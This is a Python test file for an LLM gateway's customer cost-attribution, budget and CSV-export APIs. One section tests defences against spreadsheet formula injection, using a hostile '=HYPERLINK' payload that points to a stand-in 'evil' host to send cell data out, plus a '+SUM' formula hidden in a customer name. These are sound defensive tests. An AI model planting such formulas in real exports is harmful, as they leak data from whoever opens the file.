"""Pre-development tests for cost attribution and budget APIs (US-001).

Interface tests (imports, dataclass shapes, signatures, type hints) PASS
immediately on the stub cost_attribution.py raising NotImplementedError.
The UsageRecord.customer_id field tests PASS because the developer-side
field already landed in cost_tracking.py during P0-1 scaffolding.

Behavioral tests FAIL with NotImplementedError during the RED phase and
become active once cost_attribution.py is implemented. The populated-store
fixture seeds the SQLite schema + rows directly via SQL (bypassing stub
methods) so the behavioral tests exercise the real store methods, which
raise NotImplementedError on the stub.

Normative spec: analysis/analysis-brief.md §4–§5.
"""

from __future__ import annotations

import csv
import inspect
import io
import sqlite3
from dataclasses import fields, is_dataclass
from typing import get_type_hints

import httpx
import pytest
from llm_budget_gateway.cost_attribution import (
    CostAttributionStore,
    CustomerBudgetStatus,
    CustomerSpendSummary,
    DailySpendPoint,
    ModelSpend,
    UsageLedgerRow,
)

# ===========================================================================
# Helpers
# ===========================================================================

_CREATE_CUSTOMERS = """
CREATE TABLE IF NOT EXISTS customers (
    id            TEXT PRIMARY KEY,
    name          TEXT NOT NULL,
    tenant        TEXT NOT NULL DEFAULT 'local',
    created_at    INTEGER NOT NULL
)
"""
_CREATE_CUSTOMER_BUDGETS = """
CREATE TABLE IF NOT EXISTS customer_budgets (
    customer_id       TEXT PRIMARY KEY REFERENCES customers(id) ON DELETE CASCADE,
    monthly_limit_usd REAL NOT NULL CHECK (monthly_limit_usd > 0),
    updated_at        INTEGER NOT NULL
)
"""
_CREATE_COST_RECORDS = """
CREATE TABLE IF NOT EXISTS cost_records (
    request_id TEXT PRIMARY KEY,
    api_key TEXT NOT NULL,
    user_id TEXT,
    team TEXT,
    model TEXT NOT NULL,
    provider TEXT NOT NULL,
    prompt_tokens INTEGER NOT NULL,
    completion_tokens INTEGER NOT NULL,
    total_tokens INTEGER NOT NULL,
    reasoning_tokens INTEGER NOT NULL DEFAULT 0,
    input_cost REAL NOT NULL,
    output_cost REAL NOT NULL,
    reasoning_cost REAL NOT NULL DEFAULT 0.0,
    total_cost REAL NOT NULL,
    latency_ms INTEGER NOT NULL,
    status TEXT NOT NULL,
    status_code INTEGER,
    timestamp INTEGER NOT NULL,
    tool_name TEXT,
    project TEXT,
    route TEXT,
    client_id TEXT,
    client_profile TEXT,
    cache_hit INTEGER NOT NULL DEFAULT 0,
    conversation_id TEXT,
    customer_id TEXT
)
"""


def _build_schema(conn: sqlite3.Connection) -> None:
    """Create the full schema the store will need (customers, budgets,
    cost_records with customer_id) so fixtures can seed rows directly."""
    conn.execute(_CREATE_CUSTOMERS)
    conn.execute(_CREATE_CUSTOMER_BUDGETS)
    conn.execute(_CREATE_COST_RECORDS)
    conn.commit()


def _insert_usage(
    conn: sqlite3.Connection,
    *,
    request_id: str,
    customer_id: str,
    model: str = "gpt-4o",
    total_cost: float = 0.01,
    total_tokens: int = 1500,
    prompt_tokens: int = 1000,
    completion_tokens: int = 500,
    timestamp: int | None = None,
) -> None:
    """Insert a usage row directly (bypassing stub store methods)."""
    import time

    ts = timestamp if timestamp is not None else int(time.time())
    conn.execute(
        """
        INSERT INTO cost_records (
            request_id, api_key, user_id, team, model, provider,
            prompt_tokens, completion_tokens, total_tokens, reasoning_tokens,
            input_cost, output_cost, reasoning_cost, total_cost, latency_ms,
            status, status_code, timestamp, tool_name, project, route,
            client_id, client_profile, cache_hit, conversation_id, customer_id
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            request_id, "sk_test", None, None, model, "openai",
            prompt_tokens, completion_tokens, total_tokens, 0,
            total_cost * 0.4, total_cost * 0.6, 0.0, total_cost, 120,
            "success", None, ts, None, None, "route-default",
            "client-a", "default", 0, None, customer_id,
        ),
    )
    conn.commit()


# ===========================================================================
# Fixtures
# ===========================================================================


@pytest.fixture
def attribution_store() -> CostAttributionStore:
    """Fresh CostAttributionStore on an in-memory SQLite connection."""
    conn = sqlite3.connect(":memory:")
    _build_schema(conn)
    return CostAttributionStore(conn)


@pytest.fixture
def populated_store(attribution_store: CostAttributionStore) -> CostAttributionStore:
    """Store with one customer, one budget, and three usage records across
    two days and two models — enough to exercise every aggregation path."""
    conn = attribution_store._conn  # noqa: SLF001
    # Seed schema + customer + budget + usage rows directly via SQL
    _build_schema(conn)
    conn.execute(
        "INSERT INTO customers (id, name, tenant, created_at) VALUES (?, ?, 'local', ?)",
        ("cus_1", "Acme Corp", 1_700_000_000),
    )
    conn.execute(
        "INSERT INTO customer_budgets (customer_id, monthly_limit_usd, updated_at) "
        "VALUES (?, ?, ?)",
        ("cus_1", 100.0, 1_700_000_000),
    )
    conn.commit()

    import time

    now = int(time.time())
    today = now - (now % 86400)
    yesterday = today - 86400

    _insert_usage(
        conn,
        request_id="req-1",
        customer_id="cus_1",
        model="gpt-4o",
        total_cost=8.0,
        total_tokens=2000,
        timestamp=today,
    )
    _insert_usage(
        conn,
        request_id="req-2",
        customer_id="cus_1",
        model="gemini-3.6-flash",
        total_cost=4.0,
        total_tokens=900,
        timestamp=today,
    )
    _insert_usage(
        conn,
        request_id="req-3",
        customer_id="cus_1",
        model="gpt-4o",
        total_cost=2.0,
        total_tokens=500,
        timestamp=yesterday,
    )
    return attribution_store


# ===========================================================================
# SECTION 1 — Interface tests (PASS immediately on stub)
# ===========================================================================


class TestModuleImports:
    """Verify the cost_attribution module loads and exports the expected names."""

    def test_import_cost_attribution_store(self):
        from llm_budget_gateway import cost_attribution
        assert hasattr(cost_attribution, "CostAttributionStore")

    def test_import_all_dataclasses(self):
        from llm_budget_gateway import cost_attribution
        for name in (
            "CustomerSpendSummary",
            "DailySpendPoint",
            "ModelSpend",
            "CustomerBudgetStatus",
            "UsageLedgerRow",
        ):
            assert hasattr(cost_attribution, name), f"Missing export: {name}"


class TestCostAttributionStoreShape:
    """Verify CostAttributionStore class exists and is constructible on the stub."""

    def test_class_exists(self):
        assert inspect.isclass(CostAttributionStore)

    def test_init_signature(self):
        sig = inspect.signature(CostAttributionStore.__init__)
        params = list(sig.parameters.keys())
        assert params == ["self", "connection"]

    def test_init_connection_annotation(self):
        hints = get_type_hints(CostAttributionStore.__init__)
        assert "connection" in hints
        conn_type = hints["connection"]
        # With from __future__ import annotations, may be string or type
        assert conn_type is sqlite3.Connection or conn_type == "sqlite3.Connection"

    def test_constructible(self, attribution_store):
        assert isinstance(attribution_store, CostAttributionStore)


class TestStoreMethodSignatures:
    """Verify each public method has the expected signature."""

    @pytest.mark.parametrize(
        "method_name, expected_params",
        [
            ("create_customer", ["self", "name", "tenant"]),
            ("list_customers", ["self"]),
            ("get_customer", ["self", "customer_id"]),
            ("set_monthly_budget", ["self", "customer_id", "limit_usd"]),
            ("get_budget", ["self", "customer_id"]),
            ("mtd_summary", ["self", "customer_id", "now_epoch"]),
            ("daily_spend", ["self", "customer_id", "days", "granularity"]),
            ("spend_by_model", ["self", "customer_id", "since_epoch"]),
            ("ledger_rows", ["self", "customer_id", "limit"]),
        ],
    )
    def test_method_signature(self, method_name, expected_params):
        method = getattr(CostAttributionStore, method_name)
        sig = inspect.signature(method)
        actual = list(sig.parameters.keys())
        assert actual == expected_params, (
            f"{method_name}: expected {expected_params}, got {actual}"
        )

    @pytest.mark.parametrize(
        "method_name, param, default_val",
        [
            ("create_customer", "tenant", "local"),
            ("mtd_summary", "now_epoch", None),
            ("daily_spend", "days", 31),
            ("daily_spend", "granularity", "day"),
            ("spend_by_model", "since_epoch", None),
            ("ledger_rows", "limit", 10000),
        ],
    )
    def test_method_default_values(self, method_name, param, default_val):
        method = getattr(CostAttributionStore, method_name)
        sig = inspect.signature(method)
        assert sig.parameters[param].default == default_val, (
            f"{method_name}.{param}: expected default {default_val!r}, "
            f"got {sig.parameters[param].default!r}"
        )

    @pytest.mark.parametrize(
        "method_name, expected_ret",
        [
            ("create_customer", "dict"),
            ("list_customers", "list"),
            ("get_customer", "dict"),
            ("set_monthly_budget", "dict"),
            ("get_budget", "dict"),
            ("mtd_summary", "CustomerSpendSummary"),
            ("daily_spend", "list"),
            ("spend_by_model", "list"),
            ("ledger_rows", "list"),
        ],
    )
    def test_method_return_annotation(self, method_name, expected_ret):
        method = getattr(CostAttributionStore, method_name)
        sig = inspect.signature(method)
        ret = sig.return_annotation
        assert ret is not inspect.Parameter.empty, (
            f"{method_name} has no return annotation"
        )
        assert expected_ret in str(ret), (
            f"{method_name} return annotation {ret!r} does not mention {expected_ret!r}"
        )


class TestDataclassShapes:
    """Verify dataclass fields match the spec §4.3."""

    @pytest.mark.parametrize(
        "cls, expected_fields",
        [
            (CustomerSpendSummary, [
                "customer_id", "customer_name", "mtd_cost_usd", "mtd_calls",
                "mtd_total_tokens", "mtd_prompt_tokens", "mtd_completion_tokens",
            ]),
            (DailySpendPoint, ["date", "cost_usd", "calls", "total_tokens"]),
            (ModelSpend, ["model", "cost_usd", "calls", "total_tokens"]),
            (CustomerBudgetStatus, [
                "customer_id", "monthly_limit_usd", "mtd_spend_usd",
                "percent_used", "remaining_usd", "reset_day",
            ]),
            (UsageLedgerRow, ["customer", "timestamp", "model", "tokens", "cost"]),
        ],
    )
    def test_is_dataclass(self, cls, expected_fields):
        assert is_dataclass(cls), f"{cls.__name__} is not a dataclass"

    @pytest.mark.parametrize(
        "cls, expected_fields",
        [
            (CustomerSpendSummary, [
                "customer_id", "customer_name", "mtd_cost_usd", "mtd_calls",
                "mtd_total_tokens", "mtd_prompt_tokens", "mtd_completion_tokens",
            ]),
            (DailySpendPoint, ["date", "cost_usd", "calls", "total_tokens"]),
            (ModelSpend, ["model", "cost_usd", "calls", "total_tokens"]),
            (CustomerBudgetStatus, [
                "customer_id", "monthly_limit_usd", "mtd_spend_usd",
                "percent_used", "remaining_usd", "reset_day",
            ]),
            (UsageLedgerRow, ["customer", "timestamp", "model", "tokens", "cost"]),
        ],
    )
    def test_field_names(self, cls, expected_fields):
        field_names = {f.name for f in fields(cls)}
        for name in expected_fields:
            assert name in field_names, f"{cls.__name__} missing field: {name}"

    @pytest.mark.parametrize(
        "cls, expected_fields",
        [
            (CustomerSpendSummary, [
                "customer_id", "customer_name", "mtd_cost_usd", "mtd_calls",
                "mtd_total_tokens", "mtd_prompt_tokens", "mtd_completion_tokens",
            ]),
            (DailySpendPoint, ["date", "cost_usd", "calls", "total_tokens"]),
            (ModelSpend, ["model", "cost_usd", "calls", "total_tokens"]),
            (CustomerBudgetStatus, [
                "customer_id", "monthly_limit_usd", "mtd_spend_usd",
                "percent_used", "remaining_usd", "reset_day",
            ]),
            (UsageLedgerRow, ["customer", "timestamp", "model", "tokens", "cost"]),
        ],
    )
    def test_no_extra_fields(self, cls, expected_fields):
        field_names = {f.name for f in fields(cls)}
        assert field_names == set(expected_fields), (
            f"{cls.__name__} has unexpected fields: {field_names - set(expected_fields)}"
        )


class TestDataclassFieldTypes:
    """Verify field type annotations match the spec."""

    def test_customerspendsummary_types(self):
        hints = get_type_hints(CustomerSpendSummary)
        assert hints["customer_id"] in (str, "str")
        assert hints["customer_name"] in (str, "str")
        assert hints["mtd_cost_usd"] in (float, "float")
        assert hints["mtd_calls"] in (int, "int")
        assert hints["mtd_total_tokens"] in (int, "int")
        assert hints["mtd_prompt_tokens"] in (int, "int")
        assert hints["mtd_completion_tokens"] in (int, "int")

    def test_customerbudgetstatus_types(self):
        hints = get_type_hints(CustomerBudgetStatus)
        assert hints["customer_id"] in (str, "str")
        assert hints["monthly_limit_usd"] in (float, "float")
        assert hints["mtd_spend_usd"] in (float, "float")
        assert hints["percent_used"] in (float, "float")
        assert hints["remaining_usd"] in (float, "float")
        assert hints["reset_day"] in (int, "int")

    def test_usageledgerrow_types(self):
        hints = get_type_hints(UsageLedgerRow)
        assert hints["customer"] in (str, "str")
        assert hints["timestamp"] in (str, "str")
        assert hints["model"] in (str, "str")
        assert hints["tokens"] in (int, "int")
        assert hints["cost"] in (float, "float")


class TestUsageRecordCustomerIdField:
    """UsageRecord needs a customer_id: str | None field (brief §4.2).
    The field was added during P0-1 scaffolding, so these pass immediately."""

    def test_customer_id_field_exists(self):
        from llm_budget_gateway.cost_tracking import UsageRecord
        annotations = UsageRecord.__annotations__
        assert "customer_id" in annotations, (
            "UsageRecord is missing 'customer_id' field — add it as str | None"
        )

    def test_customer_id_is_optional_string(self):
        from llm_budget_gateway.cost_tracking import UsageRecord
        annotations = UsageRecord.__annotations__
        ct = annotations.get("customer_id")
        assert ct is not None, "customer_id annotation is None"
        ct_str = str(ct)
        assert "str" in ct_str, f"customer_id should be str | None, got {ct_str}"
        assert "None" in ct_str, f"customer_id should be str | None, got {ct_str}"


# ===========================================================================
# SECTION 2 — Behavioral tests (FAIL with NotImplementedError until implemented)
# ===========================================================================


class TestCreateCustomerBehavioral:
    """RED: Customer creation and duplicate detection."""

    def test_create_customer_persists(self, attribution_store):
        result = attribution_store.create_customer("Acme Corp")
        assert "id" in result
        assert result["name"] == "Acme Corp"

    def test_create_customer_duplicate_raises_valueerror(self, attribution_store):
        attribution_store.create_customer("Acme Corp")
        with pytest.raises(ValueError):
            attribution_store.create_customer("Acme Corp")

    def test_create_customer_custom_tenant(self, attribution_store):
        result = attribution_store.create_customer("Beta Inc", tenant="acme")
        assert result.get("tenant") == "acme"


class TestListCustomersBehavioral:
    """RED: Customer listing includes MTD summary."""

    def test_list_customers_empty(self, attribution_store):
        result = attribution_store.list_customers()
        assert result == []

    def test_list_customers_includes_mtd(self, populated_store):
        customers = populated_store.list_customers()
        assert len(customers) == 1
        cust = customers[0]
        assert cust["name"] == "Acme Corp"
        assert "mtd" in cust or "mtd_cost_usd" in cust
        # MTD cost should reflect the seeded ledger rows (8 + 4 + 2 = 14.0)
        mtd = cust.get("mtd", cust)
        assert mtd.get("cost_usd", mtd.get("mtd_cost_usd")) == pytest.approx(14.0)


class TestGetCustomerBehavioral:
    """RED: Customer lookup."""

    def test_get_existing_customer(self, populated_store):
        found = populated_store.get_customer("cus_1")
        assert found is not None
        assert found["name"] == "Acme Corp"

    def test_get_nonexistent_customer_returns_none(self, attribution_store):
        result = attribution_store.get_customer("cus_nonexistent")
        assert result is None


class TestBudgetBehavioral:
    """RED: Monthly budget CRUD and percent computation from ledger."""

    def test_set_and_get_budget(self, attribution_store):
        customer_id = attribution_store.create_customer("Acme Corp")["id"]
        attribution_store.set_monthly_budget(customer_id, 100.0)
        got = attribution_store.get_budget(customer_id)
        assert got is not None
        assert got["monthly_limit_usd"] == 100.0
        assert "percent_used" in got
        assert "remaining_usd" in got

    def test_budget_upsert(self, attribution_store):
        customer_id = attribution_store.create_customer("Acme Corp")["id"]
        attribution_store.set_monthly_budget(customer_id, 100.0)
        attribution_store.set_monthly_budget(customer_id, 200.0)
        got = attribution_store.get_budget(customer_id)
        assert got["monthly_limit_usd"] == 200.0

    def test_budget_percent_from_ledger(self, populated_store):
        """Percent must be computed from ledger MTD spend (14.0/100 = 14%), not
        a stale counter."""
        budget = populated_store.get_budget("cus_1")
        assert budget is not None
        assert budget["monthly_limit_usd"] == 100.0
        assert budget["mtd_spend_usd"] == pytest.approx(14.0)
        assert budget["percent_used"] == pytest.approx(14.0)
        assert budget["remaining_usd"] == pytest.approx(86.0)

    def test_budget_percent_clamped_at_100(self, attribution_store):
        customer_id = attribution_store.create_customer("Acme Corp")["id"]
        attribution_store.set_monthly_budget(customer_id, 10.0)
        # Seed spend far above limit → percent_used must clamp to 100
        _insert_usage(
            attribution_store._conn,  # noqa: SLF001
            request_id="req-over",
            customer_id=customer_id,
            total_cost=50.0,
        )
        budget = attribution_store.get_budget(customer_id)
        assert budget["percent_used"] == 100.0
        assert budget["remaining_usd"] == 0.0


class TestMtdSummaryBehavioral:
    """RED: MTD summary reflects recorded spend immediately (§4.6, 60s SLO)."""

    def test_mtd_summary_empty_customer(self, attribution_store):
        summary = attribution_store.mtd_summary("cus_nonexistent")
        assert summary.mtd_cost_usd == 0.0
        assert summary.mtd_calls == 0

    def test_mtd_summary_totals(self, populated_store):
        """Seeded rows: 3 calls, cost 8+4+2=14.0, tokens 2000+900+500=3400,
        prompt 1000*3=3000, completion 500*3=1500 (all rows use defaults)."""
        summary = populated_store.mtd_summary("cus_1")
        assert summary.mtd_calls == 3
        assert summary.mtd_cost_usd == pytest.approx(14.0)
        assert summary.mtd_total_tokens == 3400
        assert summary.mtd_prompt_tokens == 3000
        assert summary.mtd_completion_tokens == 1500

    def test_mtd_summary_includes_record_immediately(self, populated_store):
        """After recording a completed request, MTD summary must reflect it
        immediately (0s freshness — pins the ≤60s attribution SLO)."""
        before = populated_store.mtd_summary("cus_1")
        _insert_usage(
            populated_store._conn,  # noqa: SLF001
            request_id="req-fresh",
            customer_id="cus_1",
            total_cost=1.0,
            total_tokens=100,
        )
        after = populated_store.mtd_summary("cus_1")
        assert after.mtd_calls == before.mtd_calls + 1
        assert after.mtd_cost_usd == pytest.approx(before.mtd_cost_usd + 1.0)

    def test_mtd_summary_excludes_other_customers(self, attribution_store):
        """Other customers' rows must not leak into this customer's summary."""
        # Seed a second customer with spend
        attribution_store._conn.execute(  # noqa: SLF001
            "INSERT INTO customers (id, name, tenant, created_at) "
            "VALUES ('cus_other', 'Other Inc', 'local', 1700000000)"
        )
        attribution_store._conn.commit()  # noqa: SLF001
        _insert_usage(
            attribution_store._conn,  # noqa: SLF001
            request_id="req-other",
            customer_id="cus_other",
            total_cost=99.0,
        )
        summary = attribution_store.mtd_summary("cus_1")
        assert summary.mtd_calls == 0
        assert summary.mtd_cost_usd == 0.0


class TestDailySpendBehavioral:
    """RED: Daily/weekly/monthly aggregation buckets."""

    def test_daily_spend_empty(self, attribution_store):
        result = attribution_store.daily_spend("cus_nonexistent")
        assert isinstance(result, list)
        assert len(result) == 0

    def test_daily_spend_points(self, populated_store):
        """Seeded rows land on today and yesterday; each point carries
        cost/calls/tokens."""

        points = populated_store.daily_spend("cus_1", days=7)
        assert len(points) >= 2
        for point in points:
            assert hasattr(point, "date")
            assert hasattr(point, "cost_usd")
            assert hasattr(point, "calls")
            assert hasattr(point, "total_tokens")
        # newest point first? daily_spend returns ASC per canonical SQL; just
        # verify total sums are consistent
        total_cost = sum(p.cost_usd for p in points)
        assert total_cost == pytest.approx(14.0)

    def test_daily_spend_granularity_options(self, populated_store):
        for granularity in ("day", "week", "month"):
            result = populated_store.daily_spend(
                "cus_1", days=30, granularity=granularity
            )
            assert isinstance(result, list)

    def test_daily_spend_days_clamp(self, populated_store):
        """Days parameter clamps to 1..90 (brief §5.5) — no crash."""
        populated_store.daily_spend("cus_1", days=0)
        populated_store.daily_spend("cus_1", days=999)

    def test_daily_spend_excludes_other_customers(self, attribution_store):
        attribution_store._conn.execute(  # noqa: SLF001
            "INSERT INTO customers (id, name, tenant, created_at) "
            "VALUES ('cus_other', 'Other Inc', 'local', 1700000000)"
        )
        attribution_store._conn.commit()  # noqa: SLF001
        _insert_usage(
            attribution_store._conn,  # noqa: SLF001
            request_id="req-other",
            customer_id="cus_other",
            total_cost=99.0,
        )
        result = attribution_store.daily_spend("cus_1", days=7)
        assert sum(p.cost_usd for p in result) == 0.0


class TestSpendByModelBehavioral:
    """RED: Per-model breakdown sorted by cost descending."""

    def test_spend_by_model_empty(self, attribution_store):
        result = attribution_store.spend_by_model("cus_nonexistent")
        assert isinstance(result, list)
        assert len(result) == 0

    def test_spend_by_model_sorted_cost_desc(self, populated_store):
        """gpt-4o: 8+2=10.0; gemini-3.6-flash: 4.0 → sorted [gpt-4o, gemini]."""
        result = populated_store.spend_by_model("cus_1")
        assert len(result) == 2
        costs = [m.cost_usd for m in result]
        assert costs == sorted(costs, reverse=True)
        assert result[0].model == "gpt-4o"
        assert result[0].cost_usd == pytest.approx(10.0)
        assert result[1].cost_usd == pytest.approx(4.0)


class TestLedgerRowsBehavioral:
    """RED: CSV-ready ledger rows with newest-first ordering."""

    def test_ledger_rows_empty(self, attribution_store):
        result = attribution_store.ledger_rows("cus_nonexistent")
        assert isinstance(result, list)
        assert len(result) == 0

    def test_ledger_rows_newest_first(self, populated_store):
        rows = populated_store.ledger_rows("cus_1")
        assert len(rows) == 3
        timestamps = [r.timestamp for r in rows]
        assert timestamps == sorted(timestamps, reverse=True)

    def test_ledger_row_fields(self, populated_store):
        """Each row must have customer, timestamp, model, tokens, cost."""
        rows = populated_store.ledger_rows("cus_1")
        assert len(rows) == 3
        for row in rows:
            assert hasattr(row, "customer")
            assert hasattr(row, "timestamp")
            assert hasattr(row, "model")
            assert hasattr(row, "tokens")
            assert hasattr(row, "cost")

    def test_ledger_row_values(self, populated_store):
        """Row values map to the ledger: customer=name, tokens=total_tokens,
        cost=total_cost."""
        rows = populated_store.ledger_rows("cus_1")
        # Just verify the shape of values for every row
        for row in rows:
            assert row.customer == "Acme Corp"
            assert row.model in ("gpt-4o", "gemini-3.6-flash")
            assert row.tokens > 0
            assert row.cost > 0.0


class TestCsvExportBehavioral:
    """RED: CSV export rows with exact header shape (brief §5.7)."""

    @staticmethod
    def _to_csv(rows) -> str:
        header = ["customer", "timestamp", "model", "tokens", "cost"]
        buf = io.StringIO()
        writer = csv.DictWriter(buf, fieldnames=header)
        writer.writeheader()
        for row in rows:
            writer.writerow({
                "customer": row.customer,
                "timestamp": row.timestamp,
                "model": row.model,
                "tokens": row.tokens,
                "cost": row.cost,
            })
        return buf.getvalue()

    def test_csv_header_exact(self, populated_store):
        """CSV header must be exactly: customer,timestamp,model,tokens,cost
        (handle CRLF line endings)."""
        rows = populated_store.ledger_rows("cus_1")
        content = self._to_csv(rows)
        first_line = content.split("\n")[0].rstrip("\r")
        assert first_line == "customer,timestamp,model,tokens,cost"

    def test_csv_row_count_matches_ledger(self, populated_store):
        rows = populated_store.ledger_rows("cus_1")
        lines = [line for line in self._to_csv(rows).strip().split("\n") if line]
        assert len(lines) == 1 + len(rows)

    def test_csv_empty_customer_header_only(self, attribution_store):
        """Empty customer ledger → header-only CSV, no crash (brief §5.7)."""
        rows = attribution_store.ledger_rows("cus_nonexistent")
        lines = [line for line in self._to_csv(rows).strip().split("\n") if line]
        assert len(lines) == 1  # header only


# ===========================================================================
# SECTION 3 — CSV formula-injection neutralization (review blocker fix)
# ===========================================================================


class TestCsvFormulaInjectionNeutralization:
    """The export endpoint must neutralize spreadsheet formula triggers
    (review blocker, tech-lead t_fe28737e comment 1318).

    Model and customer cells originate from client-supplied data and can
    start with '=', '+', '-', '@', tab or CR — Excel/LibreOffice/Sheets
    would execute those as formulas on open. The guard prefixes a single
    apostrophe BEFORE csv.writer quoting, so the exported cell carries the
    literal text with the apostrophe preserved.
    """

    @staticmethod
    async def _export_csv(
        customer_id: str, store: CostAttributionStore
    ) -> httpx.Response:
        """GET the live /export.csv endpoint and return the raw body."""
        import httpx

        from llm_budget_gateway.console_api import create_console_app

        conn = store._conn  # noqa: SLF001
        app = create_console_app(cost_connection=conn)
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app), base_url="http://console"
        ) as client:
            return await client.get(
                f"/v1/product/customers/{customer_id}/export.csv"
            )

    @staticmethod
    def _seed_customer_with_rows(
        store: CostAttributionStore, *, customer_name: str, model: str
    ) -> str:
        """Create a customer + one ledger row with the given hostile values."""
        conn = store._conn  # noqa: SLF001
        customer_id = store.create_customer(customer_name)["id"]
        conn.execute(
            """
            INSERT INTO cost_records (
                request_id, api_key, user_id, team, model, provider,
                prompt_tokens, completion_tokens, total_tokens, reasoning_tokens,
                input_cost, output_cost, reasoning_cost, total_cost, latency_ms,
                status, status_code, timestamp, tool_name, project, route,
                client_id, client_profile, cache_hit, conversation_id, customer_id
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                "req-evil", "sk_test", None, None, model, "openai",
                100, 50, 150, 0, 0.4, 0.6, 0.0, 1.0, 120,
                "success", None, 1_700_000_000, None, None, "route-default",
                "client-a", "default", 0, None, customer_id,
            ),
        )
        conn.commit()
        return customer_id

    @pytest.mark.asyncio
    async def test_model_cell_formula_injection_neutralized(
        self, attribution_store
    ):
        """A model named '=HYPERLINK(...)' must export as the literal text
        with a leading apostrophe — not as a live formula."""
        payload = '=HYPERLINK("http://evil/?c="&A1)'
        customer_id = self._seed_customer_with_rows(
            attribution_store, customer_name="Acme Corp", model=payload
        )
        response = await self._export_csv(customer_id, attribution_store)
        assert response.status_code == 200
        rows = list(csv.reader(io.StringIO(response.text)))
        assert rows[0] == ["customer", "timestamp", "model", "tokens", "cost"]
        assert rows[1][2] == f"'{payload}"  # apostrophe preserved

    @pytest.mark.asyncio
    async def test_customer_name_plus_prefixed_neutralized(
        self, attribution_store
    ):
        """A customer name starting with '+' must be neutralized too."""
        customer_id = self._seed_customer_with_rows(
            attribution_store, customer_name="+SUM(A1:A9)", model="gpt-4o"
        )
        response = await self._export_csv(customer_id, attribution_store)
        assert response.status_code == 200
        rows = list(csv.reader(io.StringIO(response.text)))
        assert rows[1][0] == "'+SUM(A1:A9)"  # apostrophe preserved

    @pytest.mark.asyncio
    async def test_export_contract_unchanged(self, attribution_store):
        """AC#3 contract: exact header, attachment disposition, text/csv."""
        customer_id = self._seed_customer_with_rows(
            attribution_store, customer_name="Acme Corp", model="gpt-4o"
        )
        response = await self._export_csv(customer_id, attribution_store)
        assert response.status_code == 200
        assert response.headers["content-type"].startswith("text/csv")
        assert "attachment" in response.headers["content-disposition"]
        rows = list(csv.reader(io.StringIO(response.text)))
        assert rows[0] == ["customer", "timestamp", "model", "tokens", "cost"]
